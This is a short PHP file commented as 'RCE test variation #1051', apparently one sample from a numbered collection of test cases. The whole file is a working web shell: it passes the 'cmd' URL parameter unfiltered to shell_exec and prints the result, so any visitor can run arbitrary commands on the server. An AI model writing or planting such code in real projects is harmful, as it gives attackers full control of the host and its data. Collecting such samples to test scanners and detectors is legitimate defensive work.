<?php
// RCE test variation #1051
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>